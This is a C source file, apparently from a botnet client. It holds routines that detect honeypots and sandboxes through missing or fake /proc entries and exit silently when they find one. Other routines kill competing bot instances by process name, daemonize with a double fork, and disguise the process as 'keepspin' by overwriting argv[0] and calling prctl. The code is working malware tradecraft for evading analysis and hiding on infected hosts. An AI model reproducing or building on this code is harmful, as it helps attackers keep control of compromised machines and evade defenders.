#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <dirent.h>
#include <ctype.h>
#include <errno.h>

/* Bot process names that we want to kill if found running (competing instances).
   Extend this list if the bot is deployed under different masquerade names. */
static const char *KILL_COMMS[] = { "keepspin", NULL };

void cleanup_old_processes(void) {
    /* No /proc → almost certainly a honeypot or sandbox. Exit silently. */
    if (access("/proc", F_OK) != 0) _exit(0);

    /* Verify /proc is a real procfs, not a fake directory planted by a honeypot.
       A real procfs exposes /proc/self/comm with our own name. */
    {
        int selffd = open("/proc/self/comm", O_RDONLY);
        if (selffd < 0) _exit(0);  /* real procfs always has /proc/self/comm */
        close(selffd);
    }

    pid_t mypid = getpid();
    DIR *proc = opendir("/proc");
    if (!proc) return;

    struct dirent *ent;
    char comm_path[64], comm_buf[64];

    while ((ent = readdir(proc))) {
        if (!isdigit((unsigned char)ent->d_name[0])) continue;

        pid_t pid = (pid_t)atoi(ent->d_name);
        if (pid <= 1 || pid == mypid) continue;

        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)pid);
        int fd = open(comm_path, O_RDONLY);
        if (fd < 0) continue;

        ssize_t r = read(fd, comm_buf, sizeof(comm_buf) - 1);
        close(fd);
        if (r <= 0) continue;

        comm_buf[r] = 0;
        comm_buf[strcspn(comm_buf, "\r\n")] = 0;

        /* Kill any running instance of ourselves. */
        for (int k = 0; KILL_COMMS[k]; k++) {
            if (strcmp(comm_buf, KILL_COMMS[k]) == 0) {
                kill(pid, SIGKILL);
                break;
            }
        }
    }
    closedir(proc);
}

void daemonize(int argc, char **argv)
{
    srand(time(NULL));
    cleanup_old_processes();

    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    if (setsid() < 0) exit(1);

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    size_t shlen = strlen("keepspin");
    memset(argv[0], 0, strlen(argv[0]));
    memcpy(argv[0], "keepspin", shlen);
    prctl(PR_SET_NAME, (unsigned long)"keepspin", 0, 0, 0);
}
